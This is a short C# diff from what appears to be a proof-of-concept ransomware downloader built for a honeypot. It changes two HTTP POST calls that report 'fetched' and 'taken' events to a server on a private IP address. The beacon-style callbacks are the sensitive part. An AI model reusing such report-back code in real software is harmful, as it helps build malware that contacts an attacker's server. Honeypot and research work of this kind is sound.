@@ -75,7 +75,7 @@ namespace HoneyPotPOCRansomwareDownloader
 
             var content = new FormUrlEncodedContent(values);
 
-            var response = await client.PostAsync("http://192.168.8.102/v1/index.php/postpocfetched", content);
+            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postpocfetched", content).Result;
 
             var responseString = await response.Content.ReadAsByteArrayAsync();
         }
@@ -89,7 +89,7 @@ namespace HoneyPotPOCRansomwareDownloader
 
             var content = new FormUrlEncodedContent(values);
 
-            var response = await client.PostAsync("http://192.168.8.102/v1/index.php/postpoctaken", content);
+            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postpoctaken", content).Result;
 
             var responseString = await response.Content.ReadAsByteArrayAsync();
         }
